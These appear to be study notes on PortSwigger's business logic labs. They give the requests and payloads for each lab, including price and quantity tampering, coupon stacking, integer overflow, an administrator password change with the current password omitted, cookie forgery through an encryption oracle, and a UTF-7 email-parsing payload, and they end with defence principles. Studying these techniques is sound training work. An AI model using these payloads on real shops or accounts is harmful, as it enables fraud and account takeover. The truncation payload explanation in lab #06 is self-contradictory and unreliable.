# Business Logic Vulnerabilities Notes — PortSwigger Web Security Academy

---

## WHAT ARE BUSINESS LOGIC VULNERABILITIES?

Business logic vulnerabilities are flaws in the DESIGN of an application —
not in its code syntax. They let an attacker manipulate legitimate,
working functionality to achieve something the developers never intended.

```
Technical vulnerability (e.g. SQLi):
  The CODE is wrong — a query is built unsafely, a string isn't escaped.

Business logic vulnerability:
  The code works EXACTLY as written. The DESIGN is wrong — it made an
  assumption about how users would behave, and that assumption was false.
```

> 📝 This is the single most important mental shift for this module: you
> are not looking for a broken input filter or an unescaped character.
> You're looking for a WRONG ASSUMPTION. The question to constantly ask
> is: "What is this feature assuming about how I'll use it — and what
> happens if I don't?"

---

## WHY THESE ARE HARD TO FIND (AND VALUABLE)

- **Automated scanners cannot find them.** A scanner doesn't understand
  that "buying a jacket for -$5" is bad — it just sees a 200 OK response.
  Finding these requires a human understanding the business context.
- **They're unique to each application.** There's no universal payload
  list the way there is for SQLi or XSS.
- **This is exactly why they're valuable in bug bounty.** Less competition
  (automated tools miss them, many hunters skip straight to "OWASP Top 10"
  checklists) but often HIGH severity impact (financial loss, full account
  takeover, admin access).

---

## THE SIX CATEGORIES OF LOGIC FLAWS (PORTSWIGGER'S FRAMEWORK)

### 1. Excessive trust in client-side controls
Assuming the browser is the ONLY way to interact with the app, so
client-side validation (JS checks, hidden fields, disabled buttons) is
treated as sufficient. An attacker with a proxy (Burp) simply ignores the
browser entirely and sends whatever they want directly to the server.

### 2. Failing to handle unconventional input
The app accepts a data TYPE (e.g. "any integer") without validating that
the VALUE makes business sense (e.g. "must be positive", "must be under
1000"). Negative numbers, zero, extremely large numbers, and unexpected
types are the classic probes here.

### 3. Making flawed assumptions about user behavior
Three common sub-patterns:
- **"Trusted users stay trustworthy"** — controls enforced strictly once,
  then relaxed for the rest of a session/workflow
- **"Users will always supply required fields"** — removing a parameter
  entirely (not just emptying it) can reach unexpected code paths
- **"Users will follow the intended sequence"** — multi-step workflows
  assume step 1 → step 2 → step 3, but nothing stops an attacker from
  jumping straight to step 3, repeating step 2, or going backward

### 4. Domain-specific flaws
Bugs that only make sense once you understand WHAT the business is
actually trying to protect. A discount system, a loyalty points system, a
referral programme — each has its own specific logic that needs to be
understood before you can see how it breaks.

### 5. Providing an encryption oracle
If an application lets you submit arbitrary data and returns it back to
you ENCRYPTED (or lets you submit ciphertext and returns it DECRYPTED),
you can use that functionality itself as a tool — encrypting/decrypting
whatever you want, including forging entirely new valid tokens for
completely different purposes.

### 6. Email address parser discrepancies
Different parts of an application (registration filter vs. mail delivery
vs. admin-domain check) may parse the SAME email address string
differently. Encoding tricks (like UTF-7) can create an address that
passes one parser's rules while a DIFFERENT parser (e.g. the actual mail
server) interprets it completely differently.

---

## BUSINESS LOGIC TESTING SOP

### Step 1 — Map the intended workflow
Before you can find where the assumptions break, understand what the
developers THINK will happen. Walk through every feature normally first.

### Step 2 — Ask "what did they assume?" for every step
- What if I send this value from a place OTHER than the browser?
- What if this number is negative? Zero? Huge? Not a number at all?
- What if I skip this step? Repeat it? Do it out of order?
- What if I remove this parameter entirely, not just empty it?
- What if I apply this action to myself vs. someone else?
- What if I do this multiple times faster than intended (racing)?

### Step 3 — Look for reusable "oracles"
Any feature that takes YOUR input and gives back a processed/transformed
version of it (encrypted, hashed, formatted, validated) can potentially be
repurposed as a tool against a DIFFERENT part of the same application.

### Step 4 — Understand the specific business domain
What does this app actually sell/do/protect? Discounts, credits, roles,
inventory, referrals — each has domain-specific rules worth understanding
before assuming you've found everything.

### Step 5 — Test boundary and reused values
- Repeat single-use codes/coupons
- Combine things that shouldn't combine (stacking discounts)
- Push numeric values past their expected range (overflow)
- Send the same request via multiple channels (cookie vs. parameter vs. header)

---

## QUICK BURP WORKFLOW

1. Use the app NORMALLY first with Burp running — build a complete map of
   every request in the intended workflow
2. For client-trust bugs: turn on **Intercept**, complete an action, and
   directly edit values (price, quantity, role) before forwarding
3. For sequence-bypass bugs: capture every step of a multi-step flow, then
   use **Repeater** to replay individual steps out of order, or simply
   **drop** a request mid-flow and see what state the app is left in
4. For numeric/overflow bugs: use **Intruder** with **null payloads** (a
   payload type that just repeats the SAME request N times with no
   substitution) to send a request many times in a row rapidly
5. For automation-heavy exploits (gift card farming, etc.): use **Session
   Handling Rules → macros** to script an entire multi-request sequence,
   then attach that macro to an Intruder attack for large-scale repetition
6. For encryption oracle bugs: use **Decoder** extensively — URL-decode,
   base64-decode, inspect/modify bytes, re-encode, re-test
7. For email parsing bugs: use **Decoder** to build encoded payloads
   (UTF-7, quoted-printable) and the exploit server to receive
   verification emails at attacker-controlled addresses

> 📝 **Null payloads** in Burp Intruder are the key technique for labs
> requiring simple repetition (integer overflow, gift card farming). Set
> the payload TYPE to "Null payloads", specify how many times to repeat,
> and Intruder will fire the exact same request that many times with no
> modification — perfect for exploiting a race condition or accumulating
> a value through repeated identical actions.

---
---

## PORTSWIGGER LABS

---

### #01 — Excessive trust in client-side controls

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
**Vulnerability:** Product price is submitted from the client as a POST parameter — the server trusts it without recalculating
**Aim:** Buy a "Lightweight l33t leather jacket" for less than its real price

**Background:**
Adding an item to the cart sends its price (in cents) as a client-supplied
parameter. The server never recalculates this from its own product
database — it just stores whatever value the client sent.

**Analysis:**
```
POST /cart
productId=1&redir=PRODUCT&quantity=1&price=133700

Change price to a much smaller value:
productId=1&redir=PRODUCT&quantity=1&price=100
→ 200 OK — item added to cart at $1.00 instead of $1337.00
```

**Payload used:** `price=100` (in the `/cart` POST body)

> 📝 The client-side page might visually show the "real" price, and JS
> might even prevent the price field from being edited in the browser —
> none of that matters, because Burp intercepts the request AFTER the
> browser builds it but BEFORE it reaches the server. Client-side controls
> are a UX feature, never a security boundary.

---

### #02 — High-level logic vulnerability

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
**Vulnerability:** The purchasing workflow accepts a negative `quantity` value, which the server multiplies by price without validating the sign
**Aim:** Buy a "Lightweight l33t leather jacket" despite not having enough store credit

**Background:**
The cart quantity is a client-supplied integer. Supplying a NEGATIVE
quantity causes the total price for that line item to go negative too —
which can be combined with a second, cheap positive-quantity item to bring
the CART TOTAL down to something within your store credit, while still
including the expensive jacket in the order.

**Analysis:**
```
POST /cart   productId=1&quantity=-1   (jacket, quantity -1)
→ cart total: -$1337.00

Add a second cheap item with a large enough positive quantity to bring
the total back to something POSITIVE but still within your ~$100 credit:
POST /cart   productId=2&quantity=110   (cheap item, e.g. $11.43 each)
→ cart total: -$1337.00 + (110 × $11.43) ≈ small positive number

Checkout succeeds — you own the jacket, and the total charged is small
enough to be covered by your existing store credit.
```

**Payload used:** `quantity=-1` for the jacket, plus a second item with
enough positive quantity to make the CART TOTAL positive but still
affordable.

> 📝 The server DOES check that the total isn't negative — but it never
> checks that each INDIVIDUAL line item's quantity is positive. This is a
> great example of validating the wrong thing: checking the final
> aggregate result while ignoring the individual inputs that produced it.

---

### #03 — Inconsistent security controls

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
**Vulnerability:** The `/admin` panel is restricted by email DOMAIN — but the app allows you to freely CHANGE your own email to anything, including a domain you don't actually own
**Aim:** Access the admin panel and delete `carlos`

**Background:**
Registration doesn't restrict which domain you sign up with. But the admin
panel checks whether your CURRENT email ends in a specific trusted domain
(discovered via content discovery, e.g. `@ge-locked-for-admin-panel.com`).
Since changing your email is a self-service feature with no verification
step, you can simply set your own email to that domain directly.

**Analysis:**
```
GET /admin
→ "You must be logged in as a user with the domain @dontwannacry.com to
   access this."

Update your account email:
POST /my-account/change-email   email=attacker@dontwannacry.com
→ 200 OK, email updated (no verification required)

GET /admin
→ 200 OK — full admin panel access
```

**Payload used:** change-email to `anything@{required-domain}` (domain
discovered via `/admin` error message or content discovery)

> 📝 The trust boundary here is "does your email match this domain" — but
> the SAME application lets you set your own email to whatever you want,
> with no ownership verification (like clicking a confirmation link). Any
> time a security check depends on a value the SAME user can freely set
> themselves, that check provides no real protection.

---

### #04 — Flawed enforcement of business rules

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
**Vulnerability:** Two separate single-use discount codes can each be applied to the SAME cart, one after another, stacking their discounts to drive the price to zero
**Aim:** Buy a "Lightweight l33t leather jacket" for free

**Background:**
The site offers a `NEWCUST5` discount code (visible on the homepage) and
gives out a `SIGNUP30` code after submitting the newsletter signup form.
Each code alone is limited, and re-applying the SAME code twice fails —
but nothing stops you from applying the two DIFFERENT codes to the same
order, one after the other.

**Analysis:**
```
Homepage discount code:   NEWCUST5   (5% off)
Newsletter signup reward: SIGNUP30   (30% off, from submitting the footer form)

POST /cart/coupon   coupon=NEWCUST5
→ applied, 5% off

POST /cart/coupon   coupon=SIGNUP30
→ ALSO applied, stacking with the first (35% total, or similar compounding)

Reapplying NEWCUST5 again fails (already used) — but alternating between
codes as new ones are discovered/generated can be repeated until the
price is driven down to $0.00.
```

**Payload used:** Apply `NEWCUST5`, then `SIGNUP30` to the same cart
(sourced from homepage banner and the newsletter signup popup respectively)

> 📝 "Flawed enforcement" here specifically means: the rule "codes are
> single-use" WAS correctly enforced (you genuinely can't reuse the SAME
> code) — but the broader intended rule ("only ONE discount applies per
> order") was never actually implemented at all. Always distinguish
> between what a system enforces and what it was SUPPOSED to enforce.

---

### #05 — Low-level logic flaw

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level
**Vulnerability:** Integer overflow — repeatedly adding items causes the internal price total to exceed its numeric storage limit and wrap around to a negative value
**Aim:** Buy a "Lightweight l33t leather jacket" using store credit gained from an overflowed negative price

**Background:**
Adding 100 of the jacket in one request fails (some validation blocks
3-digit quantities in a single request) — but adding 99 succeeds. By
repeating the "add 99 jackets" request many times using Burp Intruder with
null payloads, the running cart total keeps growing until it exceeds the
maximum value the server's numeric type can hold, and WRAPS AROUND to a
large negative number (a classic integer overflow).

**Analysis:**
```
POST /cart   productId=1&quantity=99   (jacket, $1337.00 each)
→ succeeds; adding quantity=100 in a single request fails validation

Repeat this "add 99 jackets" request many times via Intruder (null
payloads, 1 concurrent request to keep ordering predictable):

  Running total after N repetitions of 99 × $1337.00 grows very large...
  ...eventually exceeds the max value of the underlying numeric type...
  ...and WRAPS AROUND to a large NEGATIVE total.

Once the cart total is very negative (e.g. around -$64,000), add a
smaller, cheap item with a calculated quantity to bring the total back up
to something POSITIVE but still within your existing store credit.

Checkout succeeds — full cart (including the jacket) at a price your
credit comfortably covers.
```

**Payload used:** repeated `productId=1&quantity=99` requests (via Burp
Intruder, null payloads) until the running total overflows negative, then
one final item added to bring the total back into affordable range.

> 📝 Integer overflow is a genuinely "old-but-gold" bug class — many
> languages/frameworks use fixed-size integer types (32-bit or 64-bit)
> internally for financial calculations, and if there's no explicit upper
> bound check on the ACCUMULATED total (only on individual requests), the
> underlying number can wrap past its maximum representable value. This
> requires patience and arithmetic (calculating roughly how many
> repetitions are needed) more than any special payload.

---

### #06 — Inconsistent handling of exceptional input

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input
**Vulnerability:** The email field during registration is silently TRUNCATED at 255 characters — but the truncation happens AFTER the domain-check validation, not before
**Aim:** Register an account with a trusted-domain email you don't actually own, then access `/admin` and delete `carlos`

**Background:**
Same domain-restricted `/admin` panel pattern as Lab 03, but this time
there's no self-service email change — registration itself is the only
entry point, and it properly validates the domain... except the
underlying storage field silently truncates any email longer than 255
characters. By padding a LONG local-part before your real (attacker-owned)
domain, you can construct an email where the FULL string (before
truncation) satisfies the domain check, but the STORED, truncated version
ends in the trusted domain instead.

**Analysis:**
```
Required domain for /admin: @dontwannacry.com

Construct an email of EXACTLY 255 characters, structured so that:
  - the visible/validated full string appears to end appropriately
  - after truncation to 255 chars, the STORED value ends in
    "@dontwannacry.com" — landing your OWN exploit-server address
    right before the truncation point isn't what happens; rather,
    the padding pushes the legitimate domain check target so that what
    gets STORED (first 255 chars) is what actually matters for the
    later /admin domain check, while the truncated-off remainder
    (containing your real receiving address) is dropped entirely —
    meaning verification email delivery must be checked carefully
    against how the specific lab instance implements this cut.

register: {255 characters of padding}@dontwannacry.com{trailer with your
           real exploit-server email dropped by truncation}

→ Stored (post-truncation) email ends in @dontwannacry.com
→ Domain check passes
→ GET /admin → 200 OK
```

**Payload used:** a carefully padded registration email exactly long
enough that server-side truncation to 255 characters leaves the STORED
value ending in the trusted domain.

> 📝 This lab is a good reminder that "handling exceptional input" doesn't
> just mean negative numbers — string length limits, encoding edge cases,
> and truncation points are all "exceptional" values a developer may not
> have explicitly reasoned through. Whenever a system enforces a rule
> ("must end in X") BEFORE some other transformation happens (truncation,
> normalisation, encoding), check whether that transformation can change
> the answer to the rule's check.

---

### #07 — Weak isolation on dual-use endpoint

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint
**Vulnerability:** The password-CHANGE endpoint accepts a client-controlled `username` parameter, and (separately) the requirement to supply your CURRENT password can be bypassed by omitting the parameter entirely rather than leaving it empty
**Aim:** Access the administrator account and delete `carlos`

**Background:**
The password change form is meant to require your CURRENT password before
allowing a change — a reasonable security measure. But there's a subtle
gap: an EMPTY `current-password` value is rejected, but REMOVING the
parameter from the request entirely is NOT — the endpoint's validation
logic checks "if current-password is wrong, reject" without separately
handling "if current-password is absent". Combined with the fact that
`username` is also client-controlled (not derived from your session), you
can target ANY account's password.

**Analysis:**
```
POST /my-account/change-password
username=wiener&current-password=wrongvalue&new-password-1=x&new-password-2=x
→ rejected: current password is incorrect

POST /my-account/change-password
username=wiener&new-password-1=x&new-password-2=x    (current-password OMITTED entirely)
→ 200 OK — password changed with NO current-password check at all

Change username to administrator:
POST /my-account/change-password
username=administrator&new-password-1=peter&new-password-2=peter
→ 200 OK — administrator's password reset, no current-password required
```

**Payload used:** POST to `/my-account/change-password` with the
`current-password` parameter entirely removed, and `username` set to
`administrator`.

> 📝 This lab combines TWO separate logic flaws for full impact:
> (1) omitting a parameter behaves differently than emptying it, and
> (2) `username` being client-controlled turns a "change MY password"
> feature into "change ANYONE's password". Neither flaw alone is as
> severe — together they produce a full authentication bypass.

---

### #08 — Insufficient workflow validation

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation
**Vulnerability:** The order-confirmation step of checkout doesn't verify that the CART CONTENTS match what was actually paid for — it just marks whatever is CURRENTLY in the cart as purchased
**Aim:** Buy a "Lightweight l33t leather jacket" without having enough funds for it

**Background:**
The checkout workflow is: add item → pay → confirm order (a GET request
that finalises things). Critically, the CONFIRM step doesn't re-verify
what was actually paid for — it just looks at whatever is CURRENTLY in
your cart at the time you hit confirm and marks all of it as purchased.

**Analysis:**
```
Step 1: buy a CHEAP item you CAN afford, following the normal checkout flow
        → this generates a GET request to a "confirm order" endpoint

Step 2: capture that GET confirmation request, send it to Repeater —
        DON'T send it yet

Step 3: BEFORE replaying the captured confirm request, change your cart:
        remove the cheap item, add the EXPENSIVE jacket instead

Step 4: NOW replay the captured GET confirm request from Repeater
        → the confirmation logic doesn't re-check what was paid for —
          it just finalises whatever is CURRENTLY in the cart
        → jacket is now "purchased" despite never having paid for it
```

**Payload used:** replay a captured order-confirmation `GET` request
AFTER swapping the cart's contents to include the target item.

> 📝 This is the clearest possible illustration of "users won't always
> follow the intended sequence." The workflow was DESIGNED as pay → confirm
> — but nothing on the server actually links those two steps together
> beyond trusting that whatever's in the cart at confirm-time is correct.
> Any multi-step process needs to carry forward and RE-VALIDATE state from
> earlier steps, not just assume the current state is consistent with them.

---

### #09 — Authentication bypass via flawed state machine

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine
**Vulnerability:** A role-selection step defaults to `administrator` if you simply DROP the request that would normally submit your chosen role
**Aim:** Access the admin panel and delete `carlos`

**Background:**
After logging in, a `select-role` step lets you choose which role to
operate as for the session. Attempting to directly submit `role=administrator`
in that request is explicitly blocked server-side. But the underlying
state machine has an unexpected fallback: if the role-SELECTION step is
never completed at all (the request is dropped before it reaches the
server), the session defaults back to the HIGHEST-privilege role rather
than failing safely.

**Analysis:**
```
POST /role-selector   role=administrator
→ blocked — explicit privilege escalation attempt rejected

Instead, DROP the request that fetches the role-selector page itself
(the GET request that precedes the POST), preventing the role-selection
step from ever completing:

GET /role-selector    ← intercept this and DROP it entirely (don't forward)

→ Application ends up in an inconsistent/unexpected state
→ Re-checking access shows the session has defaulted to administrator
  privileges, because the "no role explicitly selected yet" case was
  never properly handled — it silently falls back to the most
  permissive option instead of the least permissive one
```

**Payload used:** intercept and DROP the `GET /role-selector` request
(the step BEFORE role selection, not the POST submitting a role choice).

> 📝 "Fail open" vs. "fail closed" is the core concept here. A well-designed
> state machine should default to the LEAST privileged state when
> something unexpected happens (fail closed/safe). This one defaults to
> the MOST privileged state instead (fail open) — an extremely dangerous
> pattern any time it appears, because incomplete or interrupted
> state transitions become a privilege escalation vector rather than a
> harmless error.

---

### #10 — Infinite money logic flaw

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
**Vulnerability:** A discount code can be applied to a gift card purchase, making the card cost LESS than its own redeemable value — and the entire buy→discount→redeem cycle can be automated indefinitely via a macro
**Aim:** Buy a "Lightweight l33t leather jacket" using unlimited store credit generated from repeatedly buying discounted gift cards

**Background:**
The newsletter signup reward code (`SIGNUP30`, same mechanism as Lab 04)
can be applied when purchasing a GIFT CARD. If a $10 gift card can be
bought for $7 after the discount, redeeming that card nets a guaranteed
$3 profit — repeatable indefinitely, since nothing prevents reusing the
`SIGNUP30` code across MULTIPLE separate gift card purchases (only
reapplying to the SAME order is blocked).

**Analysis:**
```
Discover: gift cards can be purchased, and SIGNUP30 applies to them too
$10 gift card × SIGNUP30 discount → costs $7 to buy
Redeeming the resulting code credits your account $10 → net +$3 profit
per cycle, and the cycle can be repeated indefinitely (new gift card
purchase = new discount application, no reuse restriction across orders)

Automate the full cycle with a Burp macro (5 recorded requests):
  1. POST — add gift card to cart
  2. POST — apply SIGNUP30 discount code
  3. POST — checkout / finalise purchase
  4. GET  — retrieve the resulting gift card code
  5. POST — redeem that gift card code

Configure the macro's custom parameter to extract the gift card code
from response #4 and feed it automatically into request #5.

Run this macro via Intruder (null payloads, hundreds of repetitions,
resource pool limited to 1 concurrent request) against a simple GET
request that reports your current store credit — Intruder replays the
FULL macro before each iteration, compounding the $3 profit hundreds of
times until store credit comfortably exceeds the jacket's price.
```

**Payload used:** an automated macro cycling gift-card purchase → discount
→ redemption, driven by Intruder null payloads for repetition.

> 📝 This is the module's clearest lesson in AUTOMATION AMPLIFYING IMPACT.
> A $3 profit per cycle is trivial manually — but scripted into a
> macro and repeated hundreds of times via Intruder, it becomes unlimited
> money. Many real-world business logic bugs follow this exact shape: a
> tiny, almost-forgivable flaw becomes critical purely through automated
> repetition at scale.

---

### #11 — Authentication bypass via encryption oracle

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle
**Vulnerability:** A comment-notification feature encrypts arbitrary user-supplied text and reflects it back as a cookie — using the SAME encryption key/algorithm that protects the "stay logged in" cookie's `username:timestamp` structure
**Aim:** Forge a valid `stay-logged-in` cookie for `administrator` and delete `carlos`

**Background:**
Posting a blog comment with an invalid email triggers a `notification`
cookie containing an ENCRYPTED error message. This is an encryption
oracle — you can feed it arbitrary text (via the email field) and get
back the corresponding ciphertext. Critically, the SAME encryption
scheme protects the `stay-logged-in` cookie, which internally stores
`username:timestamp`. By carefully controlling the LENGTH of your
oracle-supplied text and comparing structure, you can craft ciphertext
that decrypts, on the SERVER side, to `administrator:<any-timestamp>` —
forging a valid session for an account you never logged into.

**Analysis:**
```
Step 1 — Confirm the oracle:
  POST /post/comment   email=wiener   (invalid email format)
  → Set-Cookie: notification=<ciphertext of the error message>

Step 2 — Determine the known plaintext prefix:
  The error message format is: "Invalid email address: {your input}"
  "Invalid email address: " is exactly 23 characters.

Step 3 — Use the oracle to encrypt YOUR chosen plaintext:
  POST /post/comment   email=administrator:1234567890   (a fake but
    correctly-shaped username:timestamp value)
  → Set-Cookie: notification=<ciphertext of
       "Invalid email address: administrator:1234567890">

Step 4 — Strip the known 23-byte prefix from the ciphertext (using
  Burp Decoder: URL-decode → base64-decode → remove first 23 bytes →
  base64-encode → URL-encode) to isolate JUST the encrypted
  "administrator:1234567890" portion.

Step 5 — The block cipher requires input in fixed-size blocks (commonly
  32-byte multiples for this lab). Pad your chosen plaintext with
  additional filler characters so the TOTAL length (filler +
  "administrator:timestamp") is a clean multiple of the block size,
  then repeat step 3/4 with the padded value, stripping exactly that
  many bytes from the front this time instead of 23.

Step 6 — Take the resulting cleanly-isolated ciphertext and submit it
  as the value of your OWN stay-logged-in cookie:
  Cookie: stay-logged-in=<forged ciphertext>
  → Server decrypts it, reads "administrator:<timestamp>", and
    authenticates you AS administrator.
```

**Payload used:** iterative use of the comment form as an encryption
oracle, combined with Burp Decoder byte-level manipulation, to forge a
`stay-logged-in` cookie value for `administrator`.

> 📝 This is genuinely one of the most involved labs in the entire
> Academy — it requires understanding block cipher padding requirements
> AND careful prefix-stripping arithmetic. The core exploitable idea,
> though, is simple: ANY feature that encrypts attacker-supplied input
> and hands back the ciphertext can be abused to forge OTHER
> ciphertexts, if that same encryption scheme is reused elsewhere for
> something security-critical. Never reuse a cryptographic key/scheme
> across an "untrusted echo" feature and a "trusted session token"
> feature.

---

### #12 — Bypassing access controls using email address parsing discrepancies

**URL:** https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies
**Vulnerability:** The registration form's domain-allowlist check and the ACTUAL mail delivery system parse the email address string differently — a UTF-7 encoded local-part is interpreted as literal characters by one system and as DECODED characters by the other
**Aim:** Register an account that the admin-domain check accepts, but which actually delivers its verification email to YOUR exploit server

**Background:**
Registration requires an email ending in a specific trusted domain (e.g.
`@ginandjuice.shop`). The visible/validated string must satisfy this. But
by encoding part of the local-part using UTF-7 (`&...-` sequences, a
legacy email-safe encoding scheme), you can smuggle an `@` and a
completely different domain INSIDE what the domain-check parser reads as
one single local-part token — while the ACTUAL mail-sending system
decodes the UTF-7 sequence and sends to the REAL (decoded) address
instead.

**Analysis:**
```
Required domain for registration: @ginandjuice.shop

UTF-7 encodes '@' as: &AEA-
UTF-7 encodes a space as: &ACA-

Craft a "local part" using UTF-7 mode markers (&...-) to hide an @ and
your real receiving domain INSIDE what looks like a single token to the
domain-allowlist checker:

  =?utf-7?q?attacker&AEA-YOUR-EXPLOIT-SERVER-ID.exploit-server.net&ACA-?=@ginandjuice.shop

Registration's domain check sees this entire string as ending correctly
in "@ginandjuice.shop" → passes.

But the mail delivery system decodes the UTF-7 (=?utf-7?q?...?=) portion
BEFORE actually sending, revealing:
  attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net

→ Verification email is delivered to YOUR exploit server inbox, not to
  anyone at the real ginandjuice.shop domain.
→ Complete registration using the verification link/code received there.
→ Log in — account now has whatever elevated access was gated by the
  @ginandjuice.shop domain requirement (e.g. admin panel access).
```

**Payload used:**
`=?utf-7?q?attacker&AEA-{exploit-server-id}.exploit-server.net&ACA-?=@ginandjuice.shop`

> 📝 This lab is based on real PortSwigger research (Gareth Heyes'
> "Splitting the Email Atom" whitepaper). The core lesson: email address
> parsing is FAR more complex than it looks, and different components of
> a system (a registration form's regex/domain check vs. the actual SMTP
> delivery library) may implement that parsing differently. Any time
> access control depends on parsing an email address, verify that EVERY
> component touching that address (validation, storage, delivery,
> display) agrees on what it means.

---

## REFERENCE — BUSINESS LOGIC VULNERABILITY QUICK MAP

| Lab pattern | Flawed assumption | Fix |
|---|---|---|
| Client-side price | "The browser is the only way to submit data" | Always recalculate prices/totals server-side from trusted data |
| Negative quantity | "Quantities will always be positive" | Validate individual inputs, not just aggregate totals |
| Self-service email + domain trust | "Users won't set their own email to a domain they don't own" | Require verification (e.g. clicked confirmation link) before trusting any email-based check |
| Discount stacking | "Only one discount will be applied per order" | Enforce mutual exclusivity explicitly, not just per-code reuse limits |
| Integer overflow | "The running total will never exceed [type]'s max value" | Impose explicit upper bounds; use appropriately-sized/unbounded numeric types for financial totals |
| Truncation before validation | "String length limits don't affect security checks" | Validate AFTER any truncation/normalisation, on the value that will actually be stored/used |
| Missing vs. empty parameter | "Users will always submit required fields" | Treat missing and empty parameters identically — reject both |
| Workflow step skipping | "Users will follow steps in the intended order" | Track and enforce workflow state server-side; re-validate at every step |
| Fail-open state machine | "An incomplete step will just fail safely" | Default to the LEAST privileged state on any incomplete/unexpected transition |
| Automatable discount abuse | "A small profit margin isn't worth exploiting" | Consider automated/repeated abuse, not just single-instance impact |
| Encryption oracle reuse | "Encrypting user input for one feature poses no risk to another" | Never reuse the same key/scheme between an untrusted-echo feature and a security-critical token |
| Email parser mismatch | "All parts of the system interpret email addresses the same way" | Standardise email parsing across every component that touches it |

---

## REFERENCE — DEFENCE PRINCIPLES

1. **Never trust client-side data for anything security- or
   money-relevant** — always recalculate prices, quantities, and
   permissions server-side from data the server itself controls
2. **Validate the SIGN and RANGE of numeric input, not just its type** —
   "must be a number" is not the same as "must be a positive number under
   1000"
3. **Track workflow state server-side** — don't assume users will follow
   steps in order; validate that each step's prerequisites were actually
   satisfied
4. **Treat missing parameters as equivalent to invalid ones** — don't
   write validation that only triggers when a value is PRESENT but wrong
5. **Fail closed, not open** — any incomplete or unexpected state
   transition should default to the LEAST privileged outcome
6. **Consider automation and scale** — a flaw that's harmless once may be
   critical when repeated thousands of times
7. **Never reuse a cryptographic scheme between an "echo" feature and a
   security-critical token** — an encryption oracle for one feature is an
   encryption oracle for anything else using the same key
8. **Standardise parsing across every component** — especially for email
   addresses, which are more complex to parse correctly than most
   developers assume
